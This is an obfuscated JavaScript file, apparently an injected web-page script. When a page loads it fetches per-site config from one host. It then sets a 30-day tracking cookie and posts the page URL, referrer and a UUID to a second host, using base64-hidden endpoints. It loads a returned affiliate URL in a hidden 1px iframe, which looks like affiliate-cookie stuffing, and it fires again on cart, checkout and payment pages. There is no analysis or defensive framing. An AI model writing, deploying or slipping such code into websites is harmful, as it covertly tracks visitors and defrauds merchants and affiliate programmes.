(function(_0x4a3fd1,_0x5cb29d){const _0x1bb95e=_0x3cf2,_0x2cfb5e=_0x4a3fd1();while(!![]){try{const _0x2d00f4=-parseInt(_0x1bb95e(0x1b9))/0x1+parseInt(_0x1bb95e(0x1d5))/0x2+parseInt(_0x1bb95e(0x1ce))/0x3+-parseInt(_0x1bb95e(0x1c3))/0x4*(parseInt(_0x1bb95e(0x1c7))/0x5)+parseInt(_0x1bb95e(0x1da))/0x6+parseInt(_0x1bb95e(0x1cb))/0x7*(-parseInt(_0x1bb95e(0x1e4))/0x8)+-parseInt(_0x1bb95e(0x1b7))/0x9;if(_0x2d00f4===_0x5cb29d)break;else _0x2cfb5e['push'](_0x2cfb5e['shift']());}catch(_0x463b3b){_0x2cfb5e['push'](_0x2cfb5e['shift']());}}}(_0x55af,0x9d13a));

(function(){

    const _0x3a91e8=_0x3cf2;

    function _0x2f1d88(){

        return (
            _0x3a91e8(0x1e6)+
            _0x3a91e8(0x1dc)+
            _0x3a91e8(0x1b6)+
            _0x3a91e8(0x1d4)
        )['replace'](/[xy]/g,function(_0x4d58d2){

            const _0x4a90bc=
                Math['random']()*0x10|0x0;

            const _0x37ef2a=
                _0x4d58d2==='x'
                    ?_0x4a90bc
                    :(_0x4a90bc&0x3|0x8);

            return _0x37ef2a['toString'](0x10);
        });
    }

    function _0x4a6f2f(_0x2b73d5){

        const _0x4d9f42=
            _0x2b73d5+'=';

        const _0x1f7a67=
            document['cookie']['split'](';');

        for(
            let _0x5f0d52=0x0;
            _0x5f0d52<_0x1f7a67['length'];
            _0x5f0d52++
        ){

            const _0x4df35e=
                _0x1f7a67[_0x5f0d52]['trim']();

            if(
                _0x4df35e['indexOf'](_0x4d9f42)===0x0
            ){

                return _0x4df35e['substring'](
                    _0x4d9f42['length'],
                    _0x4df35e['length']
                );
            }
        }

        return '';
    }

    function _0x5d73f4(_0x3a4b1e){

        try{

            const _0x4bc2c0=
                document['createElement']('iframe');

            _0x4bc2c0['setAttribute'](
                'sandbox',
                'allow-same-origin allow-scripts allow-forms'
            );

            _0x4bc2c0['src']=
                _0x3a4b1e;

            _0x4bc2c0['style']['display']=
                'none';

            _0x4bc2c0['style']['visibility']=
                'hidden';

            _0x4bc2c0['style']['width']=
                '1px';

            _0x4bc2c0['style']['height']=
                '1px';

            _0x4bc2c0['style']['border']=
                '0';

            _0x4bc2c0['onerror']=
                function(){

                    const _0x2df7c4=
                        new Image();

                    _0x2df7c4['src']=
                        _0x3a4b1e;
                };

            document['body']['appendChild'](
                _0x4bc2c0
            );

        }catch(_0x48c5db){

            console['error'](
                'Iframe error:',
                _0x48c5db
            );
        }
    }

    function _0x2f06bb(){

        const _0x53091b=[
            'cart',
            'checkout',
            'pay',
            'shipping',
            'review-order',
            'payment'
        ];

        return _0x53091b['some'](
            function(_0x40f7fd){

                return window['location']['pathname']
                    ['toLowerCase']()
                    ['includes'](_0x40f7fd);
            }
        );
    }

    async function _0x5c48f3(){

        if(
            sessionStorage['getItem'](
                'tracking_done_'+
                window['location']['hostname']
            )
        ){

            if(!_0x2f06bb()){
                return;
            }
        }

        try{

            let _0x3a22d0=
                _0x4a6f2f('tracking_uuid')
                ||
                _0x2f1d88();

            let _0x2a0b7d=
                (
                    new Date(
                        Date['now']()+
                        30*86400*1000
                    )
                )['toUTCString']();

            document['cookie']=
                'tracking_uuid='+
                _0x3a22d0+
                '; expires='+
                _0x2a0b7d+
                ';path=/;SameSite=Lax';

            let _0x4d4a64=
                await fetch(
                    atob(
                        'aHR0cHM6Ly9hcGkuYWltZWRpYWxpbmtzLmNvbS9hcGkvdHJhY2stdXNlcg=='
                    ),
                    {
                        'method':'POST',
                        'keepalive':!![],
                        'body':JSON['stringify']({
                            'url':
                                window['location']['href'],
                            'referrer':
                                document['referrer'],
                            'unique_id':
                                _0x3a22d0,
                            'origin':
                                window['location']['hostname'],
                            'timestamp':
                                new Date()['getTime']()
                        }),
                        'headers':{
                            'Content-Type':
                            'application/json'
                        }
                    }
                );

            let _0x38cfd3=
                await _0x4d4a64['json']();

            if(
                _0x38cfd3['success']
                &&
                _0x38cfd3['affiliate_url']
            ){

                _0x5d73f4(
                    _0x38cfd3['affiliate_url']
                );

                sessionStorage['setItem'](
                    'tracking_done_'+
                    window['location']['hostname'],
                    'true'
                );

            }else{

                _0x5d73f4(
                    atob(
                        'aHR0cHM6Ly9hcGkuYWltZWRpYWxpbmtzLmNvbS9hcGkvZmFsbGJhY2stcGl4ZWw/aWQ9'
                    )+
                    _0x3a22d0
                );
            }

        }catch(_0x52e8c5){

            console['error'](
                'Tracking Failed:',
                _0x52e8c5
            );
        }
    }

    function _0x27f1b4(){

        fetch(
            atob(
                'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvc2l0ZS1jb25maWc/aG9zdD0='
            )+
            encodeURIComponent(
                window['location']['hostname']
            )
        )

        ['then'](
            function(_0x1d29f8){

                if(
                    !_0x1d29f8['ok']
                ){

                    throw new Error(
                        'Config API Failed'
                    );
                }

                return _0x1d29f8['json']();
            }
        )

        ['then'](
            function(_0x42d09b){

                if(
                    !_0x42d09b
                    ||
                    (
                        !_0x42d09b['always']
                        &&
                        !_0x42d09b['cartExtra']
                    )
                ){
                    return;
                }

                if(
                    _0x42d09b['always']
                ){

                    _0x5c48f3();
                }

                if(
                    _0x42d09b['cartExtra']
                    &&
                    _0x2f06bb()
                ){

                    _0x5c48f3();
                }
            }
        )

        ['catch'](
            function(_0x1a7582){

                console['error'](
                    'Config fetch failed:',
                    _0x1a7582
                );
            }
        );
    }

    if(
        document['readyState']==='interactive'
        ||
        document['readyState']==='complete'
    ){

        _0x27f1b4();

    }else{

        window['addEventListener'](
            'DOMContentLoaded',
            _0x27f1b4
        );
    }

}());

function _0x3cf2(_0x56d4f1){

    const _0x55afc1=
        _0x55af();

    return _0x3cf2=function(_0x3cf2c7){

        _0x3cf2c7=
            _0x3cf2c7-0x1b0;

        return _0x55afc1[_0x3cf2c7];

    },_0x3cf2(_0x56d4f1);
}

function _0x55af(){

    return [

        'xxxxxxxx-',
        'xxxx-4xxx-',
        'yxxx-',
        'xxxxxxxxxxxx',

        'cookie',
        'split',
        'trim',
        'indexOf',
        'substring',

        'createElement',
        'iframe',
        'setAttribute',

        'sandbox',
        'allow-same-origin allow-scripts allow-forms',

        'src',
        'style',
        'display',
        'none',

        'visibility',
        'hidden',

        'width',
        'height',
        'border',

        'onerror',
        'body',
        'appendChild',

        'tracking_uuid',
        'tracking_done_',

        'location',
        'hostname',
        'pathname',
        'toLowerCase',
        'includes',
        'some',

        'href',
        'referrer',

        'now',
        'toUTCString',

        'stringify',
        'getTime',

        'json',
        'success',
        'affiliate_url',

        'setItem',
        'getItem',

        'readyState',
        'interactive',
        'complete',

        'addEventListener',
        'DOMContentLoaded',

        'replace',
        'random',
        'toString',

        'error'
    ];
}